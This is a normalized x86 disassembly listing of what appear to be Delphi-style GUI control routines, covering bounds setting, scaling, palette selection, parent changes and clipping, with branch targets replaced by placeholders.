mov [ eax + 0x150 ] bl
sub_43c584
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41aa7c
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dcac
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43d534
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43c0a4
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_43e3ec
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_43c65c
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_4034b0
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_45c19c
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403498
push edi
xor ecx ecx
mov edx 0xb039
call sub_43e62c
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_43ce24
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403320
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403124
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403124
mov eax [ edi + 0x68 ]
call sub_403124
mov eax [ edi + 0x64 ]
call sub_408898
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41aac8
test bl bl
jle r-xdata
sub_43c728
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_43c750
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403320
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43c7d8
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_43cad8
sub_43c7f8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403124
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_43f448
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403320
mov edx ebx
mov eax edi
call sub_41ab4c
mov eax ebx
mov si 0xffd9
call sub_403320
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_43c8c0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41aedc
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_43e62c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_43e62c
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_43e62c
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_43e62c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43e62c
sub_43c954
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41ad98
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_43d43c
jmp r-xdata
xor edx edx
mov eax esi
call sub_43c7f8
sub_43c998
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403320
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_43c7d8
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403320
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_43ca40
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_43ebbc
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43d8cc
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43cad8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_43e62c
mov eax ebx
mov si 0xffd0
call sub_403320
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403320
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_43cad8
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_443f64
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_43cbf4
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_43cc18
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_43cc40
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_43cc64
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_43cc88
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_43cd83
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403320
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cd8a
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_4142a4
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403320
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403320
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_413fac
sub_43cd94
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43d8cc
mov edx edi
mov eax ebx
call sub_43ce44
mov edx edi
mov eax ebx
call sub_43e6d0
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43ce00
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_403f4c
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_43ce44
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43cea0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_43cecc
mov edx eax
mov ecx esp
mov eax esi
call sub_412cac
mov edx esp
mov eax ebx
call sub_43d310
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43cee4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_43ce88
mov ecx esp
mov edx esi
call sub_412cac
mov edx esp
mov eax ebx
call sub_43d310
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43cf0c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43cf8d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cf94
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_4038b0
sub_43cf9c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43cfc8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43cff4
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_4586f0
sub_43d024
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_43e62c
sub_43d0a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_41e104
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_41e120
sub_43d26c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_43d302
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_41afd4
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43d484
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_404304
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d309
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43d4b4
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_43d310
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_43d358
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
test esi esi
je r-xdata
mov edx ebx
call sub_4408d8
mov edx ebx
mov eax esi
call sub_440804
mov eax ebx
call sub_43cad8
sub_43d3a4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403320
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_43e62c
mov eax edi
mov si 0xffd0
call sub_403320
sub_43d43c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_45166c
mov edx ebx
mov eax esi
call sub_41ab4c
sub_43d460
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_43e62c
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_43e62c
pop ebx
retn
sub_43d484
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_43d3f8
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_403fe8
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_43d408
sub_43d4b4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43d509
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43d484
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404304
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d510
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov eax esi
call sub_4043b8
mov edx eax
mov eax ebx
call sub_43d460
sub_43d534
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_41e060
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_43e62c
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_41e060
mov [ ebx + 0x84 ] eax
sub_43d6bc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43d6ac
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_43a654
mov eax esi
call sub_43a654
jmp r-xdata
sub_43d6f4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_414164
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413ff8
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_414184
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43d8cc
mov eax ebx
call sub_454640
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403320
sub_43d774
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_43d6f4
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_43d6f4
jmp r-xdata
sub_43d798
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_43d82e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d835
lea eax [ ebp - 0xc ]
call sub_403ef8
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_4038b0
sub_43d840
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_414164
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_414108
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43ce24
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
